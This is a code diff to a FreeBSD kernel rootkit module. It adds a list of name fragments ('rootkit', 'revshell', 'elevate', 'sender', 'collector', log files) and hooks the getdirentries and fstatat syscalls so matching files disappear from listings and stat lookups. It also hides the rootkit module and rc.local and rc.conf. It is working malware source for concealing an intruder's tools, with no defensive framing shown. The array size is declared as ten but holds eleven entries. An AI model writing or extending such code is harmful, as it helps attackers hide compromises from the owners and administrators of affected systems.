@@ -174,6 +174,28 @@ struct module {
 };
 
 #define SIZE 10
+static int is_hiding_path(char kpath[MAXPATHLEN]) {
+    char *paths[SIZE] = {
+        "elevate",
+        "rootkit",
+        "revshell",
+        "sender",
+        "collector",
+        "remote",
+        "log.c",
+        "log.h",
+        "log.o",
+        // "logsrc"
+        "hide",
+    };
+    for (int i = 0; i < SIZE; i++) {
+        if (strcasestr(kpath, paths[i]) != NULL) {
+            return 1;
+        }
+    }
+
+    return 0;
+}
 
 static int getdirentries_hook(struct thread *td, void *syscall_args) {
     struct getdirentries_args *uap; 
@@ -198,7 +220,7 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
             }
 
             // Add more module to hide here
-            if (strcmp(curr_rec->d_name, "hiding.ko") == 0
+            if (is_hiding_path(curr_rec->d_name) || strcmp(curr_rec->d_name, "hiding.ko") == 0
                 || strcmp(curr_rec->d_name, "rootkit.ko") == 0
                 || strcmp(curr_rec->d_name, "rc.local") == 0
                 || strcmp(curr_rec->d_name, "rc.conf") == 0
@@ -308,8 +330,12 @@ static int
 fstatat_hook(struct thread *td, void *syscall_args)
 {
 	struct fstatat_args *uap = (struct fstatat_args *)syscall_args;
-
-	if (is_blocked_path(uap->path))
+    char kpath[MAXPATHLEN];
+    size_t done;
+    if (copyinstr(uap->path, kpath, sizeof(kpath), &done) != 0) {
+        return 0;
+    }
+	if (is_hiding_path(kpath))
 		return (ENOENT);
 
 	return (orig_fstatat(td, syscall_args));
